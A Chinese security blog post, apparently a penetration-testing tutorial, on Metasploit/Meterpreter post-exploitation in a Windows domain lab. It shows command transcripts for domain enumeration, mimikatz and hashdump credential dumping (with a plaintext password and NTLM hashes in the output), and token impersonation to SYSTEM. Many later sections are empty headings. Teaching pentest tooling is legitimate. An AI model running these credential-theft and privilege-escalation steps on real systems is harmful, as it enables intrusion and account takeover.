@@ -1,0 +1,577 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>metasploit在后渗透中的作用 | </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="daiker">
+    
+
+    
+    <meta name="description" content="前言这里简要探究下meterpreter 的使用 权限提示 getsystem  域管理员嗅探123456789101112131415161718192021msf exploit(multi/handler) &amp;gt; use post/windows/gather/enum_domainmsf post(windows/gather/enum_domain) &amp;gt; show option">
+<meta property="og:type" content="article">
+<meta property="og:title" content="metasploit在后渗透中的作用">
+<meta property="og:url" content="http://www.daiker.com.cn/2018/03/19/metasploit在后渗透中的作用/index.html">
+<meta property="og:site_name">
+<meta property="og:description" content="前言这里简要探究下meterpreter 的使用 权限提示 getsystem  域管理员嗅探123456789101112131415161718192021msf exploit(multi/handler) &amp;gt; use post/windows/gather/enum_domainmsf post(windows/gather/enum_domain) &amp;gt; show option">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-03-19T05:24:24.077Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="metasploit在后渗透中的作用">
+<meta name="twitter:description" content="前言这里简要探究下meterpreter 的使用 权限提示 getsystem  域管理员嗅探123456789101112131415161718192021msf exploit(multi/handler) &amp;gt; use post/windows/gather/enum_domainmsf post(windows/gather/enum_domain) &amp;gt; show option">
+<meta name="twitter:creator" content="@daikersec">
+
+    
+    <link rel="alternative" href="/atom.xml" title="" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.png">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.png" alt="" title=""/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title=""></a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">归档</a></li>
+					
+						<li><a href="/tags">标签</a></li>
+					
+						<li><a href="/categories">分类</a></li>
+					
+					<li>
+ 					
+						<form class="search" action="http://zhannei.baidu.com/cse/search" target="_blank">
+							<label>Search</label>
+						<input name="s" type="hidden" value= 6197743525332190000 ><input type="text" name="q" size="30" placeholder="Search"><br>
+						</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/03/19/metasploit在后渗透中的作用/" title="metasploit在后渗透中的作用" itemprop="url">metasploit在后渗透中的作用</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="daiker" target="_blank" itemprop="author">daiker</a>
+		
+  <p class="article-time">
+    <time datetime="2018-03-19T05:23:50.000Z" itemprop="datePublished"> Published 2018-03-19</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#权限提示"><span class="toc-number">2.</span> <span class="toc-text"><a href="#&#x6743;&#x9650;&#x63D0;&#x793A;" class="headerlink" title="&#x6743;&#x9650;&#x63D0;&#x793A;"></a>&#x6743;&#x9650;&#x63D0;&#x793A;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#域管理员嗅探"><span class="toc-number">3.</span> <span class="toc-text"><a href="#&#x57DF;&#x7BA1;&#x7406;&#x5458;&#x55C5;&#x63A2;" class="headerlink" title="&#x57DF;&#x7BA1;&#x7406;&#x5458;&#x55C5;&#x63A2;"></a>&#x57DF;&#x7BA1;&#x7406;&#x5458;&#x55C5;&#x63A2;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#抓取密码"><span class="toc-number">4.</span> <span class="toc-text"><a href="#&#x6293;&#x53D6;&#x5BC6;&#x7801;" class="headerlink" title="&#x6293;&#x53D6;&#x5BC6;&#x7801;"></a>&#x6293;&#x53D6;&#x5BC6;&#x7801;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#假冒令牌"><span class="toc-number">5.</span> <span class="toc-text"><a href="#&#x5047;&#x5192;&#x4EE4;&#x724C;" class="headerlink" title="&#x5047;&#x5192;&#x4EE4;&#x724C;"></a>&#x5047;&#x5192;&#x4EE4;&#x724C;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注册表操作"><span class="toc-number">6.</span> <span class="toc-text"><a href="#&#x6CE8;&#x518C;&#x8868;&#x64CD;&#x4F5C;" class="headerlink" title="&#x6CE8;&#x518C;&#x8868;&#x64CD;&#x4F5C;"></a>&#x6CE8;&#x518C;&#x8868;&#x64CD;&#x4F5C;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#端口转发"><span class="toc-number">7.</span> <span class="toc-text"><a href="#&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;" class="headerlink" title="&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;"></a>&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#截屏"><span class="toc-number">8.</span> <span class="toc-text"><a href="#&#x622A;&#x5C4F;" class="headerlink" title="&#x622A;&#x5C4F;"></a>&#x622A;&#x5C4F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#搜索文件"><span class="toc-number">9.</span> <span class="toc-text"><a href="#&#x641C;&#x7D22;&#x6587;&#x4EF6;" class="headerlink" title="&#x641C;&#x7D22;&#x6587;&#x4EF6;"></a>&#x641C;&#x7D22;&#x6587;&#x4EF6;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#抓包"><span class="toc-number">10.</span> <span class="toc-text"><a href="#&#x6293;&#x5305;" class="headerlink" title="&#x6293;&#x5305;"></a>&#x6293;&#x5305;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#开启3389"><span class="toc-number">11.</span> <span class="toc-text"><a href="#&#x5F00;&#x542F;3389" class="headerlink" title="&#x5F00;&#x542F;3389"></a>&#x5F00;&#x542F;3389</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#改变文件时间"><span class="toc-number">12.</span> <span class="toc-text"><a href="#&#x6539;&#x53D8;&#x6587;&#x4EF6;&#x65F6;&#x95F4;" class="headerlink" title="&#x6539;&#x53D8;&#x6587;&#x4EF6;&#x65F6;&#x95F4;"></a>&#x6539;&#x53D8;&#x6587;&#x4EF6;&#x65F6;&#x95F4;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#日志清除"><span class="toc-number">13.</span> <span class="toc-text"><a href="#&#x65E5;&#x5FD7;&#x6E05;&#x9664;" class="headerlink" title="&#x65E5;&#x5FD7;&#x6E05;&#x9664;"></a>&#x65E5;&#x5FD7;&#x6E05;&#x9664;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#留后门"><span class="toc-number">14.</span> <span class="toc-text"><a href="#&#x7559;&#x540E;&#x95E8;" class="headerlink" title="&#x7559;&#x540E;&#x95E8;"></a>&#x7559;&#x540E;&#x95E8;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#键盘记录"><span class="toc-number">15.</span> <span class="toc-text"><a href="#&#x952E;&#x76D8;&#x8BB0;&#x5F55;" class="headerlink" title="&#x952E;&#x76D8;&#x8BB0;&#x5F55;"></a>&#x952E;&#x76D8;&#x8BB0;&#x5F55;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#进程注入"><span class="toc-number">16.</span> <span class="toc-text"><a href="#&#x8FDB;&#x7A0B;&#x6CE8;&#x5165;" class="headerlink" title="&#x8FDB;&#x7A0B;&#x6CE8;&#x5165;"></a>&#x8FDB;&#x7A0B;&#x6CE8;&#x5165;</span></a></li></ol>
+		
+		</div>
+		
+		<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里简要探究下meterpreter 的使用</p>
+<h2 id="权限提示"><a href="#权限提示" class="headerlink" title="权限提示"></a>权限提示</h2><ol>
+<li>getsystem</li>
+</ol>
+<h2 id="域管理员嗅探"><a href="#域管理员嗅探" class="headerlink" title="域管理员嗅探"></a>域管理员嗅探</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; use post/windows/gather/enum_domain</span><br><span class="line">msf post(windows/gather/enum_domain) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (post/windows/gather/enum_domain):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line">msf post(windows/gather/enum_domain) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf post(windows/gather/enum_domain) &gt; exploit</span><br><span class="line"></span><br><span class="line">[+] FOUND Domain: test</span><br><span class="line">[+] FOUND Domain Controller: WIN-JDS94C5QEQQ (IP: 127.0.0.1)</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf post(windows/gather/enum_domain) &gt; exploit</span><br><span class="line"></span><br><span class="line">[+] FOUND Domain: test</span><br><span class="line">[+] FOUND Domain Controller: WIN-JDS94C5QEQQ (IP: 127.0.0.1)</span><br><span class="line">[*] Post module execution completed</span><br></pre></td></tr></table></figure>
+<h2 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz </span><br><span class="line">Loading extension mimikatz...Success.</span><br><span class="line">meterpreter &gt; help</span><br><span class="line">...</span><br><span class="line">Mimikatz Commands</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">    Command           Description</span><br><span class="line">    -------           -----------</span><br><span class="line">    kerberos          Attempt to retrieve kerberos creds</span><br><span class="line">    livessp           Attempt to retrieve livessp creds</span><br><span class="line">    mimikatz_command  Run a custom command</span><br><span class="line">    msv               Attempt to retrieve msv creds (hashes)</span><br><span class="line">    ssp               Attempt to retrieve ssp creds</span><br><span class="line">    tspkg             Attempt to retrieve tspkg creds</span><br><span class="line">    wdigest           Attempt to retrieve wdigest creds</span><br><span class="line"></span><br><span class="line">meterpreter &gt; wdigest </span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs</span><br><span class="line">[+] Got SeDebugPrivilege</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;49485   NTLM                                    </span><br><span class="line">0;293672  Kerberos   TEST          Administrator  TopSec_2017</span><br><span class="line">0;996     Negotiate  TEST          TOPSEC$        ba 42 06 75 2b cd 83 7d ea f0 9f 4d 2e a2 03 97 eb de 0d 28 4c 5c 43 6b 64 ee bf 4e 23 75 4c 03 46 93 2c 54 70 e2 4f 0f 8b ef 34 6b 9e f2 de 5a 6f 92 7a 6e 10 0d fe 94 fc 3e 89 02 db 2e a9 ab cd 52 1e 7f 98 20 b8 cf 24 f6 1b f9 a1 b8 9c 10 e7 a4 f1 b3 16 18 5b 5a 15 b2 d3 c2 20 98 f6 b9 36 44 6c 78 39 1a ea bc 35 e6 cc cf c8 94 19 87 34 3e ff 05 b6 bb 91 8b 29 e8 55 0c c6 8d 7a 43 ab de 6d 5e a0 b7 4d 00 6a b8 d3 14 d1 53 2f 02 51 53 14 69 59 b4 9a e8 d2 ae ce 26 23 4e f6 de 6f 83 44 07 59 fa a5 82 c9 ac 57 28 88 97 6b 70 07 22 5c de 1f 8e d4 6e 14 85 62 3e 79 f0 9a f8 07 e7 84 53 ed 03 95 09 0b d4 3f 8a b2 78 e5 2e df b9 ed ff ff bd 57 71 19 74 cb d7 b7 66 fe 16 ee da 0f 8b 57 23 81 79 8b 98 62 48 8f 5d 9d 0c </span><br><span class="line">0;999     Negotiate  TEST          TOPSEC$        ba 42 06 75 2b cd 83 7d ea f0 9f 4d 2e a2 03 97 eb de 0d 28 4c 5c 43 6b 64 ee bf 4e 23 75 4c 03 46 93 2c 54 70 e2 4f 0f 8b ef 34 6b 9e f2 de 5a 6f 92 7a 6e 10 0d fe 94 fc 3e 89 02 db 2e a9 ab cd 52 1e 7f 98 20 b8 cf 24 f6 1b f9 a1 b8 9c 10 e7 a4 f1 b3 16 18 5b 5a 15 b2 d3 c2 20 98 f6 b9 36 44 6c 78 39 1a ea bc 35 e6 cc cf c8 94 19 87 34 3e ff 05 b6 bb 91 8b 29 e8 55 0c c6 8d 7a 43 ab de 6d 5e a0 b7 4d 00 6a b8 d3 14 d1 53 2f 02 51 53 14 69 59 b4 9a e8 d2 ae ce 26 23 4e f6 de 6f 83 44 07 59 fa a5 82 c9 ac 57 28 88 97 6b 70 07 22 5c de 1f 8e d4 6e 14 85 62 3e 79 f0 9a f8 07 e7 84 53 ed 03 95 09 0b d4 3f 8a b2 78 e5 2e df b9 ed ff ff bd 57 71 19 74 cb d7 b7 66 fe 16 ee da 0f 8b 57 23 81 79 8b 98 62 48 8f 5d 9d 0c</span><br></pre></td></tr></table></figure>
+<p>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf post(windows/gather/hashdump) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 2739ba60d0407daf0d866cb3ee4b6b9f...</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">No users with password hints on this system</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:f013ff76154a124f8cfc32f654582420:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Post module execution completed</span><br></pre></td></tr></table></figure></p>
+<h2 id="假冒令牌"><a href="#假冒令牌" class="headerlink" title="假冒令牌"></a>假冒令牌</h2><p>假冒的时候空格和斜杠注意转译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt;  use incognito</span><br><span class="line">Loading extension incognito...Success.</span><br><span class="line">meterpreter &gt; help</span><br><span class="line">...</span><br><span class="line">Incognito Commands</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">    Command              Description</span><br><span class="line">    -------              -----------</span><br><span class="line">    add_group_user       Attempt to add a user to a global group with all tokens</span><br><span class="line">    add_localgroup_user  Attempt to add a user to a local group with all tokens</span><br><span class="line">    add_user             Attempt to add a user with all tokens</span><br><span class="line">    impersonate_token    Impersonate specified token</span><br><span class="line">    list_tokens          List tokens available under current user context</span><br><span class="line">    snarf_hashes         Snarf challenge/response hashes for every token</span><br><span class="line"></span><br><span class="line">meterpreter &gt; list_tokens </span><br><span class="line">Usage: list_tokens &lt;list_order_option&gt;</span><br><span class="line"></span><br><span class="line">Lists all accessible tokens and their privilege level</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -g        List tokens by unique groupname</span><br><span class="line">    -u        List tokens by unique username</span><br><span class="line"></span><br><span class="line">meterpreter &gt; list_tokens  -u</span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">TEST\Administrator</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br><span class="line"></span><br><span class="line">meterpreter &gt; impersonate_token NT AUTHORITY\\SYSTEM</span><br><span class="line">[-] User token NT not found</span><br><span class="line">meterpreter &gt; impersonate_token NT\ AUTHORITY\\SYSTEM</span><br><span class="line">[+] Delegation token available</span><br><span class="line">[+] Successfully impersonated user NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure></p>
+<h2 id="注册表操作"><a href="#注册表操作" class="headerlink" title="注册表操作"></a>注册表操作</h2><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><h2 id="截屏"><a href="#截屏" class="headerlink" title="截屏"></a>截屏</h2><h2 id="搜索文件"><a href="#搜索文件" class="headerlink" title="搜索文件"></a>搜索文件</h2><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><h2 id="开启3389"><a href="#开启3389" class="headerlink" title="开启3389"></a>开启3389</h2><h2 id="改变文件时间"><a href="#改变文件时间" class="headerlink" title="改变文件时间"></a>改变文件时间</h2><h2 id="日志清除"><a href="#日志清除" class="headerlink" title="日志清除"></a>日志清除</h2><h2 id="留后门"><a href="#留后门" class="headerlink" title="留后门"></a>留后门</h2><h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2>  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://www.daiker.com.cn/2018/03/19/metasploit在后渗透中的作用/" data-title="metasploit在后渗透中的作用 | " data-tsina="5688081717" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2018/03/19/Linuxv0.11源码分析之引导启动程序一/"  title="Linuxv0.11源码分析之引导启动程序一">
+ <strong>下一篇：</strong><br/> 
+ <span>Linuxv0.11源码分析之引导启动程序一
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section id="comments" class="comment">
+	<div class="ds-thread" data-thread-key="2018/03/19/metasploit在后渗透中的作用/" data-title="metasploit在后渗透中的作用" data-url="http://www.daiker.com.cn/2018/03/19/metasploit在后渗透中的作用/"></div>
+</section>
+
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#权限提示"><span class="toc-number">2.</span> <span class="toc-text"><a href="#&#x6743;&#x9650;&#x63D0;&#x793A;" class="headerlink" title="&#x6743;&#x9650;&#x63D0;&#x793A;"></a>&#x6743;&#x9650;&#x63D0;&#x793A;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#域管理员嗅探"><span class="toc-number">3.</span> <span class="toc-text"><a href="#&#x57DF;&#x7BA1;&#x7406;&#x5458;&#x55C5;&#x63A2;" class="headerlink" title="&#x57DF;&#x7BA1;&#x7406;&#x5458;&#x55C5;&#x63A2;"></a>&#x57DF;&#x7BA1;&#x7406;&#x5458;&#x55C5;&#x63A2;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#抓取密码"><span class="toc-number">4.</span> <span class="toc-text"><a href="#&#x6293;&#x53D6;&#x5BC6;&#x7801;" class="headerlink" title="&#x6293;&#x53D6;&#x5BC6;&#x7801;"></a>&#x6293;&#x53D6;&#x5BC6;&#x7801;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#假冒令牌"><span class="toc-number">5.</span> <span class="toc-text"><a href="#&#x5047;&#x5192;&#x4EE4;&#x724C;" class="headerlink" title="&#x5047;&#x5192;&#x4EE4;&#x724C;"></a>&#x5047;&#x5192;&#x4EE4;&#x724C;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注册表操作"><span class="toc-number">6.</span> <span class="toc-text"><a href="#&#x6CE8;&#x518C;&#x8868;&#x64CD;&#x4F5C;" class="headerlink" title="&#x6CE8;&#x518C;&#x8868;&#x64CD;&#x4F5C;"></a>&#x6CE8;&#x518C;&#x8868;&#x64CD;&#x4F5C;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#端口转发"><span class="toc-number">7.</span> <span class="toc-text"><a href="#&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;" class="headerlink" title="&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;"></a>&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#截屏"><span class="toc-number">8.</span> <span class="toc-text"><a href="#&#x622A;&#x5C4F;" class="headerlink" title="&#x622A;&#x5C4F;"></a>&#x622A;&#x5C4F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#搜索文件"><span class="toc-number">9.</span> <span class="toc-text"><a href="#&#x641C;&#x7D22;&#x6587;&#x4EF6;" class="headerlink" title="&#x641C;&#x7D22;&#x6587;&#x4EF6;"></a>&#x641C;&#x7D22;&#x6587;&#x4EF6;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#抓包"><span class="toc-number">10.</span> <span class="toc-text"><a href="#&#x6293;&#x5305;" class="headerlink" title="&#x6293;&#x5305;"></a>&#x6293;&#x5305;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#开启3389"><span class="toc-number">11.</span> <span class="toc-text"><a href="#&#x5F00;&#x542F;3389" class="headerlink" title="&#x5F00;&#x542F;3389"></a>&#x5F00;&#x542F;3389</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#改变文件时间"><span class="toc-number">12.</span> <span class="toc-text"><a href="#&#x6539;&#x53D8;&#x6587;&#x4EF6;&#x65F6;&#x95F4;" class="headerlink" title="&#x6539;&#x53D8;&#x6587;&#x4EF6;&#x65F6;&#x95F4;"></a>&#x6539;&#x53D8;&#x6587;&#x4EF6;&#x65F6;&#x95F4;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#日志清除"><span class="toc-number">13.</span> <span class="toc-text"><a href="#&#x65E5;&#x5FD7;&#x6E05;&#x9664;" class="headerlink" title="&#x65E5;&#x5FD7;&#x6E05;&#x9664;"></a>&#x65E5;&#x5FD7;&#x6E05;&#x9664;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#留后门"><span class="toc-number">14.</span> <span class="toc-text"><a href="#&#x7559;&#x540E;&#x95E8;" class="headerlink" title="&#x7559;&#x540E;&#x95E8;"></a>&#x7559;&#x540E;&#x95E8;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#键盘记录"><span class="toc-number">15.</span> <span class="toc-text"><a href="#&#x952E;&#x76D8;&#x8BB0;&#x5F55;" class="headerlink" title="&#x952E;&#x76D8;&#x8BB0;&#x5F55;"></a>&#x952E;&#x76D8;&#x8BB0;&#x5F55;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#进程注入"><span class="toc-number">16.</span> <span class="toc-text"><a href="#&#x8FDB;&#x7A0B;&#x6CE8;&#x5165;" class="headerlink" title="&#x8FDB;&#x7A0B;&#x6CE8;&#x5165;"></a>&#x8FDB;&#x7A0B;&#x6CE8;&#x5165;</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+<div class="github-card">
+<p class="asidetitle">Github Card</p>
+<div class="github-card" data-github="daikersec" data-theme="medium"></div>
+<script type="text/javascript" src="//cdn.jsdelivr.net/github-cards/latest/widget.js" ></script>
+</div>
+
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/ctf/" title="ctf">ctf<sup>5</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/pwn/" title="pwn">pwn<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/tools/" title="tools">tools<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/注入/" title="注入">注入<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/渗透测试/" title="渗透测试">渗透测试<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/漏洞研究/" title="漏洞研究">漏洞研究<sup>1</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/Web/" title="Web">Web<sup>8</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ctf/" title="ctf">ctf<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/hackinglab/" title="hackinglab">hackinglab<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/注入/" title="注入">注入<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Linux/" title="Linux">Linux<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/漏洞研究/" title="漏洞研究">漏洞研究<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/web/" title="web">web<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/pwn/" title="pwn">pwn<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/CTF/" title="CTF">CTF<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php/" title="php">php<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/渗透/" title="渗透">渗透<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/提权/" title="提权">提权<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Kali/" title="Kali">Kali<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/tools/" title="tools">tools<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  
+  <div class="archiveslist">
